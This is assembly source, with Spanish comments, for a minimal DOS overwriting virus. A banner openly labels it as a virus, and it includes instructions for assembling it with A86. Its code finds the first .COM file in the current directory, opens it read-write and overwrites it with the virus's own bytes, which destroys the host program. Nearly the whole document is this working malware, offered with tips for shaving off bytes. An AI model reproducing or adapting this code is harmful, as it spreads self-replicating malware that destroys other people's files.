

************************
  ATENCION!!!!!!!!!!
   ESTO ES UN VIRUS
************************

Clave para entender el c¢digo:
------------------------------
Cuando DOS carga un .COM en memoria pone CX=00FF  SI=0100

Compilar con el A86.
-------------------------------------------------------------------------

  MOV AH,4EH              ; Find First
  MOV DX,NOMBRE           ; Usamos el valor 00FF de CX
  INT 21H
                          ; Al precio de 2 bytes se puede incluir
                          ; aqu¡ un JC RET. Si no se lo pone y no
                          ; hay ning£n .COM, la llamada a la Fn 40H
                          ; de abajo va a usar la pantalla como
                          ; dispositivo de salida.

  MOV AX,3D02H
  MOV DX,9EH              ; poner en dx el offset donde qued¢ el
  INT 21H                 ; nombre del archivo que encontr¢
                          ; DOS Services  ah=function 3Dh
                          ; abrir archivo, al=modo, (02h = read-write)
                          ; nombre en @ds:dx
                          ; devuelve el handle en ax

   MOV DX,SI              ; MOV DX,100H pero en 2 bytes en lugar de 3


   MOV BX,AX              ; pone el handle del archivo en bx

                          ; No inicializamos CX (usamos CX=00FF)

   MOV AH,40H
   INT 21H                ; interrupci¢n 21h, funci¢n 40h
                          ; escribir un archivo, cx=bytes, desde ds:dx
                          ; ac  escribe el virus en memoria en el disco

   RET                    ; RET ocupa 1 byte. Una llamada a la Fn 4CH, 4.


NOMBRE: DB '*.com',0


